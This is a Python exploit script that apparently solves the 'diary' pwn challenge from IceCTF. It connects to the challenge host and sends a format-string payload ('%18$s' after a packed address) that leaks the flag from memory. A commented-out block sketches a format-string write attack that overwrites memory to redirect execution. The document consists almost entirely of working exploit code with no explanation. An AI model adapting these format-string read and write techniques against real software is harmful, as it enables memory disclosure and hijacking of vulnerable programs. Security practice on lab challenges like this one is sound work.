#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'diary.vuln.icec.tf','port':6501}

addr_flag       = 0x0804a0a0
#addr_plt_puts   = 0x080484d0

#diary_count     = 0

#==========
def attack(cmn):
    exploit  = pack_32(addr_flag)
    exploit += '%18$s'

    cmn.read_until('> ')
    cmn.sendln('1')
    cmn.read_until('secrets: ')
    cmn.sendln(exploit)

    cmn.read_until('> ')
    cmn.sendln('2')

    cmn.read(4)
    info('flag : %s' % cmn.read_until())

    cmn.read_until('> ')
    cmn.sendln('3')

"""    
    add_entry(cmn, '0x%10$x')
    addr_base_main = int(print_entry(cmn), 16)
    info('addr_base_main    = 0x%08x' % addr_base_main)
    
    fsb = FSB(size=2)
    fsb.set_adrval(addr_base_main+0x4, addr_plt_puts)
    fsb.set_adrval(addr_base_main+0xc, addr_flag)
    fsb.auto_write(index=0x100/4*diary_count+18)
    
    add_entry(cmn, fsb.get())
    print_entry(cmn)

    cmn.read_until('> ')
    cmn.sendln('3')
    print cmn.read_all()

def add_entry(cmn, data):
    global diary_count
    diary_count += 1
    
    cmn.read_until('> ')
    cmn.sendln('1')

    cmn.read_until('secrets: ')
    cmn.sendln(data)

def print_entry(cmn):
    cmn.read_until('> ')
    cmn.sendln('2')

    return cmn.read_until()
"""

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    del(cmn)
    
#==========
